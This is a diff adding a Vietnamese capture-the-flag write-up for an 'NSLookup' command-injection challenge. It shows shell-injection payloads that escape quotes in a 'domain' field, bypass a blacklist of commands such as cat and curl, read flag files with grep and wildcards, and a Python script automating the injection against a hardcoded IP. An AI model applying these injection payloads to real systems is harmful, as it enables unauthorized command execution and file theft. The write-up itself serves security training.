@@ -71,3 +71,70 @@ Như vậy, chúng ta cần phải escape khỏi cặp dấu đó mới có th�
 Chúng ta có thể sử dụng payload ngắn gọn như `';cat /f*;'` để lấy flag. Ở payload này sử dụng wildcard `*` để khớp với tất cả các ký tự, nó rất hữu ích trong những trường hợp mà chúng ta không biết tên file.
 
 ![image](images/nslookup-level-2/image-2.png)
+
+## NSLookup (Level 3)
+
+> Tất cả các lệnh đọc file 'cat', 'head', 'tail', 'less', 'strings', 'nl', "ls", "*", "curl", "wget" đều bị chặn và không tồn tại trên hệ thống
+>
+> - Flag: /flagXXXX.txt
+> - Flag Format: CHH{XXX}
+
+Ở level 3 này, tác giả đã thêm vào blacklist để làm khó chúng ta hơn. Tuy nhiên, blacklist chứa rất ít từ và ký tự nên cũng không quá khó để chúng ta bypass thành công.
+
+![image](images/nslookup-level-3/image-1.png)
+
+Ngoài dấu `*` đại diện cho nhiều ký tự thì chúng ta còn có dấu `?` để đại diện cho 1 ký tự. Và chúng ta sẽ kết hợp dấu `?` này với một lệnh siêu hữu ích để đọc được file, đó chính là `grep`.
+
+Vậy, chúng ta có thể truyền payload sau vào tham số `domain` để lấy về flag.
+
+```bash
+'; grep "[a-zA-Z]" /flag?????.txt;'
+```
+
+![image](images/nslookup-level-3/image-2.png)
+
+Ngoài ra còn có một số cách khác nữa, ví dụ như sử dụng lệnh `find` để tìm được tên file flag, sau đó mới đọc flag.
+
+Mình có viết đoạn script Python sau.
+
+```python
+import requests
+import re
+
+URL = "http://103.97.125.56:32428/index.php"
+
+proxy = {
+    "http": "http://127.0.0.1:8080"
+}
+
+search_filename_payload = "'; find / -type f -maxdepth 1 2>/dev/null;'"
+read_flag_payload = "'; grep \"[a-zA-Z]\" %s;'"
+
+
+def search_filename():
+    data = {
+        "domain": search_filename_payload
+    }
+
+    r = requests.post(url=URL, data=data)
+    filename = re.search(r"/flag\w{5}.txt", r.text).group(0)
+
+    return filename
+
+
+def read_flag(filename):
+    data = {
+        "domain": read_flag_payload % filename
+    }
+
+    r = requests.post(url=URL, data=data)
+    flag = re.search(r"CHH{\w+}", r.text).group(0)
+
+    print(flag)
+
+
+if __name__ == "__main__":
+    filename = search_filename()
+    read_flag(filename)
+
+```
